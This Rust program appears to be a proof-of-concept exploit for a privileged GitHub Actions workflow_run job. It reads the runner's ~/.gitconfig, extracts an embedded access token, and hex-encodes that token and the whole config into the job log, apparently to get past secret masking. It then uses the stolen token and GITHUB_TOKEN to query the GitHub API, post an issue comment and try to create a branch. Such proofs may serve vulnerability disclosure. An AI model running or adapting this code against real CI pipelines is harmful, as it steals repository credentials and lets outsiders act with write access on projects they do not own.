use std::process::Command;

fn env(k: &str) -> String {
    std::env::var(k).unwrap_or_default()
}

fn hex(bytes: &[u8]) -> String {
    const H: &[u8; 16] = b"0123456789abcdef";
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push(H[(b >> 4) as usize] as char);
        s.push(H[(b & 0x0f) as usize] as char);
    }
    s
}

fn curl(url: &str, token: &str, method: &str, data: Option<&str>) -> String {
    let auth = format!("Authorization: Bearer {token}");
    let mut c = Command::new("curl");
    c.args([
        "-sS",
        "-i",
        "--max-time",
        "30",
        "-H",
        &auth,
        "-H",
        "Accept: application/vnd.github+json",
        "-H",
        "User-Agent: sp1-poc",
        "-X",
        method,
    ]);
    if let Some(d) = data {
        c.args(["-H", "Content-Type: application/json", "-d", d]);
    }
    c.arg(url);
    match c.output() {
        Ok(o) => format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        ),
        Err(e) => format!("CURL_ERR {e}"),
    }
}

fn token_from_gitconfig(gc: &str) -> String {
    for line in gc.lines() {
        let l = line.trim();
        let idx = match l.find("https://") {
            Some(i) => i,
            None => continue,
        };
        let rest = &l[idx + 8..];
        if let Some(at) = rest.find('@') {
            let tok = &rest[..at];
            if tok.len() > 10 {
                return tok.to_string();
            }
        }
    }
    String::new()
}

fn main() {
    println!("POC_RCE_MARKER lh6: attacker-controlled code in privileged workflow_run job");
    println!(
        "EVENT={} WORKFLOW={} REPO={} RUN_ID={} ACTOR={} SHA={}",
        env("GITHUB_EVENT_NAME"),
        env("GITHUB_WORKFLOW"),
        env("GITHUB_REPOSITORY"),
        env("GITHUB_RUN_ID"),
        env("GITHUB_ACTOR"),
        env("GITHUB_SHA")
    );
    let home = env("HOME");
    let gc = std::fs::read_to_string(format!("{home}/.gitconfig")).unwrap_or_default();
    println!("GITCONFIG_LEN={}", gc.len());
    println!("GITCONFIG_HEX={}", hex(gc.as_bytes()));
    let pull = token_from_gitconfig(&gc);
    println!("PULL_TOKEN_LEN={}", pull.len());
    println!("PULL_TOKEN_HEX={}", hex(pull.as_bytes()));
    if !pull.is_empty() {
        println!(
            "PULL_WHOAMI={}",
            curl("https://api.github.com/user", &pull, "GET", None)
        );
        println!(
            "PULL_REPO={}",
            curl(
                "https://api.github.com/repos/PDFtoMark/triage-okx-vecdc21f-c4fd2e",
                &pull,
                "GET",
                None
            )
        );
    }
    let gt = env("GITHUB_TOKEN");
    println!("GT_LEN={}", gt.len());
    println!(
        "GT_WHOAMI={}",
        curl("https://api.github.com/user", &gt, "GET", None)
    );
    println!(
        "GT_REPO={}",
        curl(
            "https://api.github.com/repos/PDFtoMark/triage-okx-vecdc21f-c4fd2e",
            &gt,
            "GET",
            None
        )
    );
    let body = format!(
        "{{\"body\":\"GITHUB_TOKEN_RCE_PROOF run={} actor={}: comment posted by github-actions[bot] from the privileged workflow_run job.\"}}",
        env("GITHUB_RUN_ID"),
        env("GITHUB_ACTOR")
    );
    println!(
        "GT_COMMENT={}",
        curl(
            "https://api.github.com/repos/PDFtoMark/triage-okx-vecdc21f-c4fd2e/issues/1/comments",
            &gt,
            "POST",
            Some(&body)
        )
    );
    println!(
        "GT_REF_WRITE_PROBE={}",
        curl(
            "https://api.github.com/repos/PDFtoMark/triage-okx-vecdc21f-c4fd2e/git/refs",
            &gt,
            "POST",
            Some("{\"ref\":\"refs/heads/should-fail\",\"sha\":\"2cebde4162b2639a3e2e20fab07d27d5626957e7\"}")
        )
    );
}
